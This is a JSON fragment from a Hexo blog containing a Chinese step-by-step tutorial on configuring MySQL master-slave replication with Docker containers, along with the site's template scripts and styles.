t1;\n```","slug":"DockerMySQLMasterSlave","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ds001r7zj30av99wge","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>下载镜像</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull mysql:5.7</span><br></pre></td></tr></table></figure>\n\n<p>目前我测试最新的8.0.27是不能测试成功的，不知道原因出在哪里，保守一点使用5.7的版本。</p>\n<span id=\"more\"></span>\n\n<p>实现效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY   TAG       IMAGE ID       CREATED         SIZE</span><br><span class=\"line\">mysql        latest    3218b38490ce   19 months ago   516MB</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>生成主数据库容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 3307:3306 \\</span><br><span class=\"line\">--privileged=<span class=\"literal\">true</span> \\</span><br><span class=\"line\">-v /docker/mysql-master/log:/var/log/mysql \\</span><br><span class=\"line\">-v /docker/mysql-master/data:/var/lib/mysql \\</span><br><span class=\"line\">-v /docker/mysql-master/conf:/etc/mysql/conf.d \\</span><br><span class=\"line\">-e MYSQL_ROOT_PASSWORD=admin \\</span><br><span class=\"line\">--name mysql-master \\</span><br><span class=\"line\">mysql:latest</span><br></pre></td></tr></table></figure>\n\n<p>具体的参数详解，可以查看<a href=\"https://nustarain.gitee.io/2023/08/10/DockerMySQL/#more\">这篇文章</a></p>\n<p>实现效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                                                  NAMES</span><br><span class=\"line\">a1f6f6e03029   mysql:latest   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   6 seconds ago   Up 5 seconds   33060/tcp, 0.0.0.0:3307-&gt;3306/tcp, :::3307-&gt;3306/tcp   mysql-master</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>添加配置文件</li>\n</ol>\n<p>进入<code>/docker/mysql-master/conf</code>目录，编辑配置文件<code>my.cnf</code>，插入以下内容：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\"><span class=\"comment\">## 设置server_id，同一局域网中需要唯一</span></span><br><span class=\"line\">server_id=101 </span><br><span class=\"line\"><span class=\"comment\">## 指定不需要同步的数据库名称</span></span><br><span class=\"line\">binlog-ignore-db=mysql  </span><br><span class=\"line\"><span class=\"comment\">## 开启二进制日志功能</span></span><br><span class=\"line\">log-bin=com-mysql-bin  </span><br><span class=\"line\"><span class=\"comment\">## 设置二进制日志使用内存大小（事务）</span></span><br><span class=\"line\">binlog_cache_size=1M  </span><br><span class=\"line\"><span class=\"comment\">## 设置使用的二进制日志格式（mixed,statement,row）</span></span><br><span class=\"line\">binlog_format=mixed  </span><br><span class=\"line\"><span class=\"comment\">## 二进制日志过期清理时间。默认值为0，表示不自动清理。</span></span><br><span class=\"line\">expire_logs_days=7  </span><br><span class=\"line\"><span class=\"comment\">## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。</span></span><br><span class=\"line\"><span class=\"comment\">## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致</span></span><br><span class=\"line\">slave_skip_errors=1062</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>重启容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart mysql-master</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>进入容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it mysql-master /bin/bash</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>授权用户</li>\n</ol>\n<p>进入数据库，添加授权用户。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">USER</span> <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;%&#x27;</span> IDENTIFIED <span class=\"keyword\">BY</span> <span class=\"string\">&#x27;123456&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">GRANT</span> REPLICATION SLAVE, REPLICATION CLIENT <span class=\"keyword\">ON</span> <span class=\"operator\">*</span>.<span class=\"operator\">*</span> <span class=\"keyword\">TO</span> <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>实现效果：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type <span class=\"string\">&#x27;help;&#x27;</span> <span class=\"keyword\">or</span> <span class=\"string\">&#x27;\\h&#x27;</span> <span class=\"keyword\">for</span> help. Type <span class=\"string\">&#x27;\\c&#x27;</span> <span class=\"keyword\">to</span> clear the <span class=\"keyword\">current</span> input statement.</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">CREATE</span> <span class=\"keyword\">USER</span> <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;%&#x27;</span> IDENTIFIED <span class=\"keyword\">BY</span> <span class=\"string\">&#x27;123456&#x27;</span>;</span><br><span class=\"line\">Query OK, <span class=\"number\">0</span> <span class=\"keyword\">rows</span> affected (<span class=\"number\">0.03</span> sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">GRANT</span> REPLICATION SLAVE, REPLICATION CLIENT <span class=\"keyword\">ON</span> <span class=\"operator\">*</span>.<span class=\"operator\">*</span> <span class=\"keyword\">TO</span> <span class=\"string\">&#x27;slave&#x27;</span>@<span class=\"string\">&#x27;%&#x27;</span>;</span><br><span class=\"line\">Query OK, <span class=\"number\">0</span> <span class=\"keyword\">rows</span> affected (<span class=\"number\">0.02</span> sec)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>查看主数据库的主状态</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">show</span> master status;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----------------------+----------+--------------+------------------+-------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> File                 <span class=\"operator\">|</span> Position <span class=\"operator\">|</span> Binlog_Do_DB <span class=\"operator\">|</span> Binlog_Ignore_DB <span class=\"operator\">|</span> Executed_Gtid_Set <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----------------------+----------+--------------+------------------+-------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> com<span class=\"operator\">-</span>mysql<span class=\"operator\">-</span>bin<span class=\"number\">.000001</span> <span class=\"operator\">|</span>      <span class=\"number\">156</span> <span class=\"operator\">|</span>              <span class=\"operator\">|</span> mysql            <span class=\"operator\">|</span>                   <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----------------------+----------+--------------+------------------+-------------------+</span></span><br><span class=\"line\"><span class=\"number\">1</span> <span class=\"type\">row</span> <span class=\"keyword\">in</span> <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li>创建从数据库容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 3308:3306 \\</span><br><span class=\"line\">--privileged=<span class=\"literal\">true</span> \\</span><br><span class=\"line\">-v /docker/mysql-slave/log:/var/log/mysql \\</span><br><span class=\"line\">-v /docker/mysql-slave/data:/var/lib/mysql \\</span><br><span class=\"line\">-v /docker/mysql-slave/conf:/etc/mysql/conf.d \\</span><br><span class=\"line\">-e MYSQL_ROOT_PASSWORD=admin \\</span><br><span class=\"line\">--name mysql-slave \\</span><br><span class=\"line\">mysql:latest</span><br></pre></td></tr></table></figure>\n\n<ol start=\"9\">\n<li>实现效果：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE          COMMAND                  CREATED              STATUS              PORTS                                                  NAMES</span><br><span class=\"line\">06a84db29686   mysql:latest   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   3 seconds ago        Up 2 seconds        33060/tcp, 0.0.0.0:3308-&gt;3306/tcp, :::3308-&gt;3306/tcp   mysql-slave</span><br><span class=\"line\">a1f6f6e03029   mysql:latest   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute   33060/tcp, 0.0.0.0:3307-&gt;3306/tcp, :::3307-&gt;3306/tcp   mysql-master</span><br></pre></td></tr></table></figure>\n\n<ol start=\"10\">\n<li>添加配置文件</li>\n</ol>\n<p>进入<code>/docker/mysql-slave/conf</code>目录，编辑配置文件<code>my.cnf</code>，插入以下内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\"><span class=\"comment\">## 设置server_id，同一局域网中需要唯一</span></span><br><span class=\"line\">server_id=102</span><br><span class=\"line\"><span class=\"comment\">## 指定不需要同步的数据库名称</span></span><br><span class=\"line\">binlog-ignore-db=mysql  </span><br><span class=\"line\"><span class=\"comment\">## 开启二进制日志功能，以备Slave作为其它数据库实例的Master时使用</span></span><br><span class=\"line\">log-bin=com-mysql-slave1-bin  </span><br><span class=\"line\"><span class=\"comment\">## 设置二进制日志使用内存大小（事务）</span></span><br><span class=\"line\">binlog_cache_size=1M  </span><br><span class=\"line\"><span class=\"comment\">## 设置使用的二进制日志格式（mixed,statement,row）</span></span><br><span class=\"line\">binlog_format=mixed  </span><br><span class=\"line\"><span class=\"comment\">## 二进制日志过期清理时间。默认值为0，表示不自动清理。</span></span><br><span class=\"line\">expire_logs_days=7  </span><br><span class=\"line\"><span class=\"comment\">## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。</span></span><br><span class=\"line\"><span class=\"comment\">## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致</span></span><br><span class=\"line\">slave_skip_errors=1062  </span><br><span class=\"line\"><span class=\"comment\">## relay_log配置中继日志</span></span><br><span class=\"line\">relay_log=com-mysql-relay-bin  </span><br><span class=\"line\"><span class=\"comment\">## log_slave_updates表示slave将复制事件写进自己的二进制日志</span></span><br><span class=\"line\">log_slave_updates=1  </span><br><span class=\"line\"><span class=\"comment\">## slave设置为只读（具有super权限的用户除外）</span></span><br><span class=\"line\">read_only=1</span><br></pre></td></tr></table></figure>\n\n<ol start=\"11\">\n<li>重启容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart mysql-slave</span><br></pre></td></tr></table></figure>\n\n<ol start=\"12\">\n<li>在从数据库中配置主从复制</li>\n</ol>\n<p>进入容器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it mysql-slave /bin/bash</span><br></pre></td></tr></table></figure>\n\n<p>进入数据库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root -padmin</span><br></pre></td></tr></table></figure>\n\n<p>开启复制功能</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">change master <span class=\"keyword\">to</span> master_host<span class=\"operator\">=</span><span class=\"string\">&#x27;192.168.1.42&#x27;</span>, master_user<span class=\"operator\">=</span><span class=\"string\">&#x27;slave&#x27;</span>, master_password<span class=\"operator\">=</span><span class=\"string\">&#x27;123456&#x27;</span>, master_port<span class=\"operator\">=</span><span class=\"number\">3307</span>, master_log_file<span class=\"operator\">=</span><span class=\"string\">&#x27;com-mysql-bin.000001&#x27;</span>, master_log_pos<span class=\"operator\">=</span><span class=\"number\">156</span>, master_connect_retry<span class=\"operator\">=</span><span class=\"number\">30</span>;</span><br></pre></td></tr></table></figure>\n\n<p>上面的宿主机ip需要根据实际情况修改。</p>\n<p>主从复制参数说明：</p>\n<ul>\n<li>master_host：主数据库的IP地址；</li>\n<li>master_port：主数据库的运行端口；</li>\n<li>master_user：在主数据库创建的用于同步数据的用户账号；</li>\n<li>master_password：在主数据库创建的用于同步数据的用户密码；</li>\n<li>master_log_file：指定从数据库要复制数据的日志文件，通过查看主数据的状态，获取File参数；</li>\n<li>master_log_pos：指定从数据库从哪个位置开始复制数据，通过查看主数据的状态，获取Position参数；</li>\n<li>master_connect_retry：连接失败重试的时间间隔，单位为秒。</li>\n</ul>\n<ol start=\"13\">\n<li>在从数据库中开启主从同步</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">start</span> slave;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"14\">\n<li>查看从数据库状态</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">show</span> slave status \\G;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">show</span> slave status \\G</span><br><span class=\"line\"><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span> <span class=\"number\">1.</span> <span class=\"type\">row</span> <span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span></span><br><span class=\"line\">               Slave_IO_State: Connecting <span class=\"keyword\">to</span> source</span><br><span class=\"line\">                  Master_Host: <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.42</span></span><br><span class=\"line\">                  Master_User: slave</span><br><span class=\"line\">                  Master_Port: <span class=\"number\">3307</span></span><br><span class=\"line\">                Connect_Retry: <span class=\"number\">30</span></span><br><span class=\"line\">              Master_Log_File: com<span class=\"operator\">-</span>mysql<span class=\"operator\">-</span>bin<span class=\"number\">.000001</span></span><br><span class=\"line\">          Read_Master_Log_Pos: <span class=\"number\">156</span></span><br><span class=\"line\">               Relay_Log_File: com<span class=\"operator\">-</span>mysql<span class=\"operator\">-</span>relay<span class=\"operator\">-</span>bin<span class=\"number\">.000001</span></span><br><span class=\"line\">                Relay_Log_Pos: <span class=\"number\">4</span></span><br><span class=\"line\">        Relay_Master_Log_File: com<span class=\"operator\">-</span>mysql<span class=\"operator\">-</span>bin<span class=\"number\">.000001</span></span><br><span class=\"line\">             Slave_IO_Running: Yes</span><br><span class=\"line\">            Slave_SQL_Running: Yes</span><br><span class=\"line\">              Replicate_Do_DB: </span><br><span class=\"line\">          Replicate_Ignore_DB: </span><br></pre></td></tr></table></figure>\n\n<ol start=\"15\">\n<li>主从复制测试</li>\n</ol>\n<p>主库新建库、新建表、插入数据：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> database db108;</span><br><span class=\"line\">use db108;</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> t1 (id <span class=\"type\">int</span>,name <span class=\"type\">varchar</span>(<span class=\"number\">20</span>));</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> t1 <span class=\"keyword\">values</span>(<span class=\"number\">1</span>,<span class=\"string\">&#x27;liuxp&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> t1;</span><br></pre></td></tr></table></figure>\n\n<p>从库查看库、查看记录，看主从同步是否成功:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">show</span> databases;</span><br><span class=\"line\">use db108;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> t1;</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>下载镜像</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull mysql:5.7</span><br></pre></td></tr></table></figure>\n\n<p>目前我测试最新的8.0.27是不能测试成功的，不知道原因出在哪里，保守一点使用5.7的版本。</p>","more":"<p>实现效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker images</span></span><br><span class=\"line\">REPOSITORY   TAG       IMAGE ID       CREATED         SIZE</span><br><span class=\"line\">mysql        latest    3218b38490ce   19 months ago   516MB</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>生成主数据库容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 3307:3306 \\</span><br><span class=\"line\">--privileged=<span class=\"literal\">true</span> \\</span><br><span class=\"line\">-v /docker/mysql-master/log:/var/log/mysql \\</span><br><span class=\"line\">-v /docker/mysql-master/data:/var/lib/mysql \\</span><br><span class=\"line\">-v /docker/mysql-master/conf:/etc/mysql/conf.d \\</span><br><span class=\"line\">-e MYSQL_ROOT_PASSWORD=admin \\</span><br><span class=\"line\">--name mysql-master \\</span><br><span class=\"line\">mysql:latest</span><br></pre></td></tr></table></figure>\n\n<p>具体的参数详解，可以查看<a href=\"https://nustarain.gitee.io/2023/08/10/DockerMySQL/#more\">这篇文章</a></p>\n<p>实现效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                                                  NAMES</span><br><span class=\"line\">a1f6f6e03029   mysql:latest   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   6 seconds ago   Up 5 seconds   33060/tcp, 0.0.0.0:3307-&gt;3306/tcp, :::3307-&gt;3306/tcp   mysql-master</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>添加配置文件</li>\n</ol>\n<p>进入<code>/docker/mysql-master/conf</code>目录，编辑配置文件<code>my.cnf</code>，插入以下内容：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\"><span class=\"comment\">## 设置server_id，同一局域网中需要唯一</span></span><br><span class=\"line\">server_id=101 </span><br><span class=\"line\"><span class=\"comment\">## 指定不需要同步的数据库名称</span></span><br><span class=\"line\">binlog-ignore-db=mysql  </span><br><span class=\"line\"><span class=\"comment\">## 开启二进制日志功能</span></span><br><span class=\"line\">log-bin=com-mysql-bin  </span><br><span class=\"line\"><span class=\"comment\">## 设置二进制日志使用内存大小（事务）</span></span><br><span class=\"line\">binlog_cache_size=1M  </span><br><span class=\"line\"><span class=\"comment\">## 设置使用的二进制日志格式（mixed,statement,row）</span></span><br><span 